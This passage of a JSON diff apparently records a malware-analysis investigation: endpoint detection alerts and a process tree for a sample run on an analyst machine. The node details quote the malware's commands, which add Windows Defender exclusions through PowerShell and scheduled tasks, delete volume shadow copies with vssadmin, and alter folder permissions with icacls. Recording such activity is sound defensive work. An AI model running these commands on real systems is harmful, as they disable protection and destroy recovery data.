@@ -1,0 +1,4395 @@
+{
+  "version": "1.0",
+  "timestamp": "2026-08-11T12:32:49Z",
+  "canvasTitle": "Sample C \u2014 on-host execution chain (secdis)",
+  "incidentLog": [
+    {
+      "id": "inc-1",
+      "timestamp": "2026-08-08T17:28:17.906Z",
+      "description": "Detection: Malware Detection Alert (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-2",
+      "timestamp": "2026-08-08T17:29:19.926Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Shellcode Injection with Parent as Provenance (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-3",
+      "timestamp": "2026-08-08T17:29:19.931Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Unbacked Shellcode from Unsigned Module (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-4",
+      "timestamp": "2026-08-08T17:29:19.935Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Network Module Loaded from Suspicious Unbacked Memory (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-5",
+      "timestamp": "2026-08-08T17:29:19.947Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Scheduled Task by a Low Reputation Process (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-6",
+      "timestamp": "2026-08-08T17:30:20.122Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Scheduled Task from a Browser or Compression Utility Descendant (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-7",
+      "timestamp": "2026-08-08T17:30:20.126Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Scheduled Task Creation by an Unusual Process (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-8",
+      "timestamp": "2026-08-08T17:30:20.135Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Suspicious Windows Schedule Child Process (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-9",
+      "timestamp": "2026-08-08T17:30:20.156Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Untrusted DLL Loaded by a Persistent Program (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-10",
+      "timestamp": "2026-08-08T17:30:20.160Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Unsigned DLL from Suspicious Directory (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-11",
+      "timestamp": "2026-08-08T17:30:20.163Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Direct Syscall from Unsigned Module (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-12",
+      "timestamp": "2026-08-08T17:30:20.181Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Native API Call from Unsigned Module (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-13",
+      "timestamp": "2026-08-08T17:30:20.192Z",
+      "description": "Detection: Malicious Behavior Detection Alert: VirtualAlloc API Call from an Unsigned DLL (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-14",
+      "timestamp": "2026-08-08T17:30:20.203Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Shellcode Execution from Low Reputation Module (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-15",
+      "timestamp": "2026-08-08T17:30:20.238Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Suspicious String Value Written to Registry Run Key (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-16",
+      "timestamp": "2026-08-08T17:30:20.257Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Suspicious Windows Defender Exclusions Added via PowerShell (process powershell.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-17",
+      "timestamp": "2026-08-08T17:30:42.567Z",
+      "description": "Detection: Disabling Windows Defender Security Settings via PowerShell (process powershell.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-18",
+      "timestamp": "2026-08-08T17:30:51.411Z",
+      "description": "Detection: Newly Observed Elastic Defend Behavior Alert",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-19",
+      "timestamp": "2026-08-08T17:31:23.484Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Suspicious NTDLL Image Load (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-20",
+      "timestamp": "2026-08-08T17:31:23.488Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Suspicious Scheduled Task Creation (process schtasks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-21",
+      "timestamp": "2026-08-08T17:31:23.509Z",
+      "description": "Detection: Malicious Behavior Detection Alert: Windows Defender Exclusions via WMI (process powershell.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-22",
+      "timestamp": "2026-08-08T17:31:23.704Z",
+      "description": "Detection: Memory Threat Detection Alert: Shellcode Injection (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-23",
+      "timestamp": "2026-08-08T17:31:32.610Z",
+      "description": "Detection: Windows Defender Exclusions Added via PowerShell (process powershell.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-24",
+      "timestamp": "2026-08-08T17:31:39.743Z",
+      "description": "Detection: Threat Intel Hash Indicator Match (process a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-25",
+      "timestamp": "2026-08-08T17:31:58.926Z",
+      "description": "Detection: Startup or Run Key Registry Modification (process xhMLks.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-26",
+      "timestamp": "2026-08-08T17:32:13.902Z",
+      "description": "Detection: File and Directory Permissions Modification (process icacls.exe)",
+      "category": "Observation"
+    },
+    {
+      "id": "inc-27",
+      "timestamp": "2026-08-08T17:32:17.244Z",
+      "description": "Detection: Threat Intel IP Address Indicator Match",
+      "category": "Observation"
+    }
+  ],
+  "diagram": {
+    "nodes": [
+      {
+        "id": "host-secdis",
+        "type": "labeledGroupNode",
+        "position": {
+          "x": 0,
+          "y": 0
+        },
+        "zIndex": 0,
+        "data": {
+          "label": "secdis  \u2014  on-host execution chain",
+          "type": "group",
+          "criticality": "High",
+          "services": [],
+          "actions": [],
+          "color": "red",
+          "transparency": 0.12,
+          "width": 7330,
+          "height": 1090,
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-7MP9c5VQOqCKqQHMH/wl4Q",
+        "type": "customNode",
+        "position": {
+          "x": 80,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "rundll32.exe",
+          "type": "other",
+          "hostname": "pid 632",
+          "ipAddress": "",
+          "os": "17:27:49 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-7MP9c5VQ",
+              "type": "Defense Evasion",
+              "technique": "T1218.011 Rundll32",
+              "details": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\rundll32.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-1rIHyUux8PKKHQ0gl4mzyg",
+        "type": "customNode",
+        "position": {
+          "x": 410,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe  x2",
+          "type": "other",
+          "hostname": "pid 20040",
+          "ipAddress": "",
+          "os": "17:27:55 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-1rIHyUux",
+              "type": "Execution",
+              "technique": "T1204.002 Malicious File",
+              "details": "\"C:\\Users\\analyst\\Downloads\\Sample C\\a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe\" "
+            }
+          ],
+          "description": "C:\\Users\\analyst\\Downloads\\Sample C\\a43853c12573d2dd8792b2380c895118266c289f10e659c457354a009efdb47c.exe  [repeated 2x until 17:28:08 UTC]",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-1jMfUzs+wV2QPkta1qeSdg",
+        "type": "customNode",
+        "position": {
+          "x": 740,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "xhMLks.exe",
+          "type": "other",
+          "hostname": "pid 21788",
+          "ipAddress": "",
+          "os": "17:30:01 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-1jMfUzs+",
+              "type": "Execution",
+              "technique": "T1204.002 Malicious File",
+              "details": "\"C:\\Users\\Public\\Br3N37\\xhMLks.exe\""
+            }
+          ],
+          "description": "C:\\Users\\Public\\Br3N37\\xhMLks.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-qFmcvO2Dtq754MgKFN7lpA",
+        "type": "customNode",
+        "position": {
+          "x": 80,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "powershell.exe",
+          "type": "other",
+          "hostname": "pid 20940",
+          "ipAddress": "",
+          "os": "17:30:11 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-qFmcvO2D",
+              "type": "Defense Evasion",
+              "technique": "T1562.001 Disable or Modify Tools",
+              "details": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Add-MpPreference -ExclusionPath 'C:\\ProgramData','C:\\Users','C:\\Program Files (x86)','C:\\' -Force"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-4uJKkoheeYQlJHnrSAFNDw",
+        "type": "customNode",
+        "position": {
+          "x": 410,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe  x10",
+          "type": "other",
+          "hostname": "pid 12340",
+          "ipAddress": "",
+          "os": "17:30:11 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-4uJKkohe",
+              "type": "Persistence",
+              "technique": "T1053.005 Scheduled Task",
+              "details": "\"C:\\Windows\\System32\\cmd.exe\" cmd.exe /c SCHTASKS /Create /F /TN \"Task1\" /SC ONCE /ST 00:00 /RL HIGHEST /RU \"SYSTEM\" /TR \"cmd.exe /c reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\\" /v \\\"C:\\Users\\Public\\Br3N37\\\" /t REG_DWORD /d 0 /f\" & SCHTASKS /Run /TN \"Task1\" & SCHTASKS /Delet"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\cmd.exe  [repeated 10x until 17:32:29 UTC]",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-wCsNKTN+scr0wqlQfmzYnA",
+        "type": "customNode",
+        "position": {
+          "x": 80,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "schtasks.exe  x10",
+          "type": "other",
+          "hostname": "pid 16180",
+          "ipAddress": "",
+          "os": "17:30:14 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-wCsNKTN+",
+              "type": "Persistence",
+              "technique": "T1053.005 Scheduled Task",
+              "details": "SCHTASKS  /Create /F /TN \"Task1\" /SC ONCE /ST 00:00 /RL HIGHEST /RU \"SYSTEM\" /TR \"cmd.exe /c reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\\" /v \\\"C:\\Users\\Public\\Br3N37\\\" /t REG_DWORD /d 0 /f\" "
+            }
+          ],
+          "description": "C:\\Windows\\System32\\schtasks.exe  [repeated 10x until 17:32:32 UTC]",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-XSLa1zfkwE3tIQhgPyAD9Q",
+        "type": "customNode",
+        "position": {
+          "x": 410,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "schtasks.exe  x10",
+          "type": "other",
+          "hostname": "pid 16924",
+          "ipAddress": "",
+          "os": "17:30:17 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-XSLa1zfk",
+              "type": "Persistence",
+              "technique": "T1053.005 Scheduled Task",
+              "details": "SCHTASKS  /Run /TN \"Task1\" "
+            }
+          ],
+          "description": "C:\\Windows\\System32\\schtasks.exe  [repeated 10x until 17:32:35 UTC]",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-0KeII8GvMPp9eJFAzDIrew",
+        "type": "customNode",
+        "position": {
+          "x": 1070,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 7748",
+          "ipAddress": "",
+          "os": "17:30:18 UTC",
+          "criticality": "Medium",
+          "services": [
+            "SYSTEM"
+          ],
+          "actions": [
+            {
+              "id": "act-0KeII8Gv",
+              "type": "Persistence",
+              "technique": "T1112 Modify Registry",
+              "details": "\"cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-8pbu/eavA1v3txos5AqdHg",
+        "type": "customNode",
+        "position": {
+          "x": 740,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "schtasks.exe  x10",
+          "type": "other",
+          "hostname": "pid 12260",
+          "ipAddress": "",
+          "os": "17:30:19 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-8pbu/eav",
+              "type": "Persistence",
+              "technique": "T1053.005 Scheduled Task",
+              "details": "SCHTASKS  /Delete /TN \"Task1\" /F"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\schtasks.exe  [repeated 10x until 17:32:35 UTC]",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "type": "customNode",
+        "position": {
+          "x": 740,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "yYRb4B.exe",
+          "type": "other",
+          "hostname": "pid 20924",
+          "ipAddress": "",
+          "os": "17:31:03 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-WZNoiPFh1ZeQFdvfq5qSqw",
+        "type": "customNode",
+        "position": {
+          "x": 1070,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "reg.exe",
+          "type": "other",
+          "hostname": "pid 23088",
+          "ipAddress": "",
+          "os": "17:31:08 UTC",
+          "criticality": "Medium",
+          "services": [
+            "SYSTEM"
+          ],
+          "actions": [
+            {
+              "id": "act-WZNoiPFh",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f"
+            }
+          ],
+          "description": "C:\\Windows\\System32\\reg.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-oJJkSPYghf6zmTX3eN9+gw",
+        "type": "customNode",
+        "position": {
+          "x": 1400,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "Fqvg0m6.exe",
+          "type": "other",
+          "hostname": "pid 10268",
+          "ipAddress": "",
+          "os": "17:31:22 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Program Files (x86)\\qB2C3S7\\Fqvg0m6.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-i2Wu1x2y//q8IZpQJrkSBA",
+        "type": "customNode",
+        "position": {
+          "x": 1070,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 18908",
+          "ipAddress": "",
+          "os": "17:31:32 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-i2Wu1x2y",
+              "type": "Impact",
+              "technique": "T1490 Inhibit System Recovery",
+              "details": "cmd.exe /c vssadmin delete shadows /all /quiet"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-KxXX6exsQ7pw9dfmoHFSlQ",
+        "type": "customNode",
+        "position": {
+          "x": 1400,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 9516",
+          "ipAddress": "",
+          "os": "17:31:52 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-KxXX6exs",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\" /inheritance:r"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-VEiS1wxX1sAsOfvjj/XQ+Q",
+        "type": "customNode",
+        "position": {
+          "x": 1730,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 24396",
+          "ipAddress": "",
+          "os": "17:31:53 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-VEiS1wxX",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-mGZGjoD2OKXNrrs6vEjefQ",
+        "type": "customNode",
+        "position": {
+          "x": 80,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 1248",
+          "ipAddress": "",
+          "os": "17:31:53 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-rbZYUaEuhjXOWSINLPRPYg",
+        "type": "customNode",
+        "position": {
+          "x": 2060,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 3496",
+          "ipAddress": "",
+          "os": "17:31:53 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-rbZYUaEu",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\" /grant:r Users:(OI)(CI)(RX) /deny Users:(OI)(CI)(DC)"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-S0d0T1WLuEc0O/IKN5LgKA",
+        "type": "customNode",
+        "position": {
+          "x": 410,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 22868",
+          "ipAddress": "",
+          "os": "17:31:53 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-2aHV7BEVdPjppbsQUTY/yA",
+        "type": "customNode",
+        "position": {
+          "x": 2390,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 7036",
+          "ipAddress": "",
+          "os": "17:31:54 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-2aHV7BEV",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /inheritance:r"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-Z5B8WrRxfHU8Nvo9qytQMQ",
+        "type": "customNode",
+        "position": {
+          "x": 2720,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 11452",
+          "ipAddress": "",
+          "os": "17:31:54 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-Z5B8WrRx",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-G8kmFE4CeaqshSkrd3L6Dg",
+        "type": "customNode",
+        "position": {
+          "x": 740,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 3448",
+          "ipAddress": "",
+          "os": "17:31:55 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
